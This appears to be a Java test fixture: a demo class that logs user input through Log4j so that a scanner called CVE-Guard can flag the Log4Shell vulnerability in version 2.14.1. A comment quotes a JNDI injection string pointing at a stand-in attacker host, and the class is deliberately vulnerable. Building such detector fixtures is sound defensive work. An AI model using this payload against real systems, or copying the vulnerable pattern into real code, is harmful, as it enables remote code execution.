package com.demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * AppLogger — demo class that invokes LogManager.getLogger().
 *
 * This file is intentionally written to call the Log4j logging chain
 * that is reachable via JndiLookup.lookup() in log4j-core < 2.15.0.
 *
 * CVE-Guard will detect this pattern and flag the MR as BLOCK when
 * the vulnerable version (2.14.1) is present in pom.xml.
 */
public class AppLogger {

    // Direct static initialisation — LogManager.getLogger() is the entry point
    // that reaches JndiLookup in vulnerable versions of log4j-core.
    private static final Logger logger = LogManager.getLogger(AppLogger.class);

    /**
     * Logs a user-supplied message.
     *
     * In log4j-core 2.14.1, if `message` contains a JNDI lookup string such as
     *   ${jndi:ldap://attacker.example.com/exploit}
     * the JndiLookup.lookup() method is called, triggering remote code execution.
     *
     * @param message the message to log (user-controlled in real applications)
     */
    public void log(String message) {
        // LINE 32 — this is the invocation CVE-Guard will flag
        logger.info("Processing request: {}", message);
    }

    public static void main(String[] args) {
        AppLogger appLogger = new AppLogger();
        appLogger.log("Hello, world!");
    }
}
